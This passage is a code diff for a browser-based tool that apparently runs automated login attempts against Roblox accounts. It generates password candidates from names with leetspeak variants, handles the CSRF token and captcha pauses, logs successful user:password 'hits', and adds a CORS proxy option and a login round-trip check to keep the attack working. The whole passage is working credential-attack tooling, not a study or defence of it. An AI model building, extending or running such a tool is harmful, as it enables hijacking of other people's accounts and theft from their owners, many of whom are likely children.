@@ -70,7 +70,7 @@ section.on{display:block}
 label.f{display:block;font-size:11px;font-weight:600;letter-spacing:.07em;
   text-transform:uppercase;color:var(--mu);margin:0 0 6px}
 
-textarea,input[type=number],input[type=password],input[type=text]{
+textarea,input[type=number],input[type=password],input[type=text],input[type=url]{
   width:100%;padding:11px 12px;border:1px solid var(--line2);border-radius:var(--r2);
   background:var(--bg2);color:var(--tx);font:inherit;
   transition:border-color .16s,background .16s;
@@ -133,6 +133,7 @@ button{font:inherit;cursor:pointer}
 .pill{font:700 10px/1 ui-monospace,monospace;padding:5px 8px;border-radius:99px;letter-spacing:.06em}
 .pill.ok{background:#10201a;color:var(--hit);border:1px solid #1e4230}
 .pill.no{background:#241112;color:var(--er);border:1px solid #4a2020}
+.pill.wr{background:#241f0e;color:var(--wr);border:1px solid #4a3c14}
 .pill.wait{background:var(--card2);color:var(--mu2);border:1px solid var(--line2)}
 
 .dock{
@@ -232,11 +233,13 @@ nav button.on::before{content:"";position:absolute;top:0;left:50%;transform:tran
 
     <div class="card">
       <h2>Connection <em id="diagSum"></em></h2>
-      <button class="btn full" id="diag">Run diagnostics</button>
-      <div class="hint">Run first. If Roblox blocks this origin, nothing else works.</div>
+      <button class="btn full" id="diag">Run full diagnostics</button>
+      <div class="hint">Verifies reachability, CSRF handshake and a real login round-trip. Run this before anything else.</div>
       <div class="diag" id="diagList">
         <div class="drow" data-k="auth"><span><b>auth.roblox.com</b></span><span class="pill wait">pending</span></div>
         <div class="drow" data-k="users"><span><b>users.roblox.com</b></span><span class="pill wait">pending</span></div>
+        <div class="drow" data-k="csrf"><span><b>csrf handshake</b></span><span class="pill wait">pending</span></div>
+        <div class="drow" data-k="login"><span><b>login round-trip</b></span><span class="pill wait">pending</span></div>
       </div>
     </div>
 
@@ -283,7 +286,14 @@ nav button.on::before{content:"";position:absolute;top:0;left:50%;transform:tran
           <button class="btn" id="keyEye" aria-label="Show key" style="flex:0 0 auto">show</button>
         </div>
       </div>
-      <div class="hint" id="capHint">Manual: a challenge pauses the run — solve it in a browser tab, then Resume.</div>
+      <div class="hint" id="capHint">Manual: a challenge pauses the run — solve it on roblox.com in another tab, then Resume.</div>
+    </div>
+
+    <div class="card">
+      <h2>Advanced</h2>
+      <label class="f" for="proxy">CORS proxy (optional)</label>
+      <input id="proxy" type="url" placeholder="https://corsproxy.io/?url=" autocomplete="off" spellcheck="false">
+      <div class="hint">Only set this if diagnostics report BLOCKED. Use a prefix that accepts the encoded URL appended, or one containing <code>{url}</code>.</div>
     </div>
 
   </section>
@@ -347,133 +357,107 @@ nav button.on::before{content:"";position:absolute;top:0;left:50%;transform:tran
 <script>
 "use strict";
 const $ = id => document.getElementById(id);
-const LOGIN = "https://auth.roblox.com/v2/login";
+const AUTH  = "https://auth.roblox.com/v2/login";
 const CSRF  = "https://auth.roblox.com/v2/logout";
+const USERS = "https://users.roblox.com";
 const COOKIE = ".ROBLOSECURITY";
 const LEET = {a:"@",e:"3",i:"1",o:"0",s:"$"};
 const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-let running=false, paused=false, stop=false, skipAcc=false, hits=[], filter="ALL";
-let tick=null, startedAt=0, autoScroll=true;
+let running=false, paused=false, stop=false, skipAcc=false;
+let hits=[], filter="ALL", tick=null, startedAt=0, pos=0, total=0;
+let autoScroll=true, csrfToken=null, cookieWarned=false;
 
-/* ---------------- ui ---------------- */
+/* ============ network ============ */
+function px(url){
+  const p=$("proxy").value.trim();
+  if(!p) return url;
+  return p.includes("{url}") ? p.replace("{url}", encodeURIComponent(url)) : p + encodeURIComponent(url);
+}
+
+async function call(url, opts){
+  try{
+    return await fetch(px(url), opts);
+  }catch(e){
+    const err = new Error("network/CORS blocked");
+    err.blocked = true;
+    throw err;
+  }
+}
+
+/* cancellable, pause-aware wait */
+async function wait(ms){
+  let left = ms;
+  while(left > 0){
+    if(stop || skipAcc) return;
+    if(paused){ await sleep(120); continue; }
+    const chunk = Math.min(200, left);
+    await sleep(chunk);
+    left -= chunk;
+  }
+}
+
+/* ============ ui ============ */
 function toast(msg){
   const d=document.createElement("div");
   d.className="toast"; d.textContent=msg;
   $("toasts").append(d);
-  setTimeout(()=>{d.style.opacity="0";d.style.transition="opacity .2s";
-    setTimeout(()=>d.remove(),220);},1700);
+  setTimeout(()=>{ d.style.transition="opacity .2s"; d.style.opacity="0";
+    setTimeout(()=>d.remove(),220); }, 1700);
 }
-
 function setChip(state, text){
   const c=$("chip");
   c.className="chip"+(state?" "+state:"");
   c.textContent=text;
 }
-
 function setProg(pct){ $("prog").style.width=Math.max(0,Math.min(100,pct))+"%"; }
-
 function setRunUI(on){
-  $("go").disabled=on;
-  $("pa").disabled=!on;
-  $("sp").disabled=!on;
-  $("skip").hidden=!on;
-  $("skip").disabled=!on;
+  $("go").disabled=on; $("pa").disabled=!on; $("sp").disabled=!on;
+  $("skip").hidden=!on; $("skip").disabled=!on;
   $("pa").textContent=paused?"Resume":"Pause";
   $("pa").className="btn "+(paused?"pri":"wr");
 }
-
 function elapsed(){
   const s=Math.floor((Date.now()-startedAt)/1000);
   return String(Math.floor(s/60)).padStart(2,"0")+":"+String(s%60).padStart(2,"0");
 }
 
-/* ---------------- log ---------------- */
+/* ============ log ============ */
 const counts={ALL:0,HIT:0,BAD:0,CAPTCHA:0,ERR:0,RATE:0,INFO:0};
 
 function say(status, detail, user, pass){
   $("logEmpty")?.remove();
-  counts[status]=(counts[status]||0)+1;
-  counts.ALL++;
+  counts[status]=(counts[status]||0)+1; counts.ALL++;
 
   const d=document.createElement("div");
-  d.className="e "+status;
-  d.dataset.status=status;
+  d.className="e "+status; d.dataset.status=status;
 
   const t=document.createElement("span"); t.className="t";
-  t.textContent=new Date().toLocaleTimeString([], {hour12:false});
-
+  t.textContent=new Date().toLocaleTimeString([],{hour12:false});
   const s=document.createElement("span"); s.className="s"; s.textContent=status;
-
   const m=document.createElement("span"); m.className="m";
   if(user){
     const u=document.createElement("span"); u.className="u";
-    u.textContent=user+":"+pass+" ";
-    m.append(u);
+    u.textContent=user+":"+pass+" "; m.append(u);
   }
   m.append(document.createTextNode(detail||""));
   d.append(t,s,m);
-
   d.dataset.txt=(status+" "+(user||"")+" "+(pass||"")+" "+(detail||"")).toLowerCase();
   $("log").append(d);
-
   while($("log").children.length>500) $("log").firstChild.remove();
 
-  paintCounts();
-  applyFilter();
+  paintCounts(); applyFilter();
   if(autoScroll && !d.hidden) $("log").scrollTop=$("log").scrollHeight;
 }
-
 function paintCounts(){
-  $("cAll").textContent=counts.ALL;
-  $("cHit").textContent=counts.HIT||0;
-  $("cCap").textContent=counts.CAPTCHA||0;
-  $("cBad").textContent=counts.BAD||0;
+  $("cAll").textContent=counts.ALL; $("cHit").textContent=counts.HIT||0;
+  $("cCap").textContent=counts.CAPTCHA||0; $("cBad").textContent=counts.BAD||0;
   $("cErr").textContent=counts.ERR||0;
 }
-
 function applyFilter(){
   const q=$("logSearch").value.trim().toLowerCase();
   for(const row of $("log").children){
     if(row.classList.contains("empty")) continue;
     const okF = filter==="ALL" || row.dataset.status===filter ||
-                (filter==="BAD" && (row.dataset.status==="BAD"||row.dataset.status==="RATE"));
-    const okQ = !q || row.dataset.txt.includes(q);
-    row.hidden = !(okF && okQ);
-  }
-}
-
-$("logSearch").addEventListener("input", applyFilter);
-$("autoScroll").addEventListener("click", () => {
-  autoScroll=!autoScroll;
-  $("autoScroll").setAttribute("aria-pressed", String(autoScroll));
-  $("autoScroll").className="btn sm"+(autoScroll?"":" dg");
-});
-$("clearLog").addEventListener("click", () => {
-  $("log").replaceChildren();
-  for(const k in counts) counts[k]=0;
-  paintCounts();
-  const e=document.createElement("div");
-  e.className="empty"; e.id="logEmpty"; e.textContent="Log cleared.";
-  $("log").append(e);
-});
-document.querySelectorAll(".fchip").forEach(b => b.addEventListener("click", () => {
-  document.querySelectorAll(".fchip").forEach(x=>x.classList.remove("on"));
-  b.classList.add("on"); filter=b.dataset.f; applyFilter();
-}));
-
-/* ---------------- tabs ---------------- */
-document.querySelectorAll("nav button").forEach(b => b.addEventListener("click", () => {
-  document.querySelectorAll("nav button").forEach(x=>x.classList.remove("on"));
-  document.querySelectorAll("section").forEach(x=>x.classList.remove("on"));
-  b.classList.add("on"); $("tab-"+b.dataset.t).classList.add("on");
-}));
-
-/* ---------------- candidates ---------------- */
-const low = w => w.toLowerCase();
-const cap = w => w[0].toUpperCase()+w.slice(1).toLowerCase();
-const leet = w => [...low(w)].map(c=>LEET[c]||c).join("");
-
-function tokenize(n){
-  const c=String(n).replace(/[^A-Za-z0-9]/g,"");
-  const p=c.replace(/([a
+      (filter==="BAD" && (row.dataset.status==="BAD"||row.dataset.status==="RATE"));
+    const ok
